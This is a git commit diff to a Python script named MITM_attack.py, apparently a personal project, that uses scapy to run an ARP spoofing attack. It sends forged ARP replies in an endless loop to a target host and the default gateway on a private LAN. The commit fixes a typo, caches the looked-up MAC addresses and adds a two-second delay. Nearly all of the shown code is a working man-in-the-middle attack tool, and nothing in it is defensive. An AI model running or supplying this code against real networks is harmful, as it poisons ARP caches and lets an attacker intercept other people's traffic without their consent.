19aafb6bc74ff42bdd45f65ae93284013bf0c137
Itamar75 <itamarkoren1@gmail.com>
2025-07-11 17:26:40 +0300

    finale changes

--- MITM_attack.py
+++ MITM_attack.py
@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import time
 
 def spoof(target_ip, target_mac, spoof_ip):
     ARP_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
@@ -11,7 +12,7 @@ def get_mac(ip):
         return reply[0][1].src
     return None
 
-def wait_till_mac_founf(ip):
+def wait_till_mac_found(ip):
     mac = None
     while not mac:
         mac = get_mac(ip)
@@ -22,10 +23,13 @@ def wait_till_mac_founf(ip):
     return mac
 
 default_gateway_ip = "192.168.68.1"
-target_ip = "192.168.68.100"
+target_ip = "192.168.68.102"
+target_mac = wait_till_mac_found(target_ip)
+default_gateway_mac = wait_till_mac_found(default_gateway_ip)
 
 if __name__ == "__main__":
     while True:
-        spoof(target_ip, wait_till_mac_founf(target_ip), default_gateway_ip)
-        spoof(default_gateway_ip, wait_till_mac_founf(default_gateway_ip), target_ip)
+        spoof(target_ip, target_mac, default_gateway_ip)
+        spoof(default_gateway_ip, default_gateway_mac, target_ip)
         print("Spoofing is active")
+        time.sleep(2)
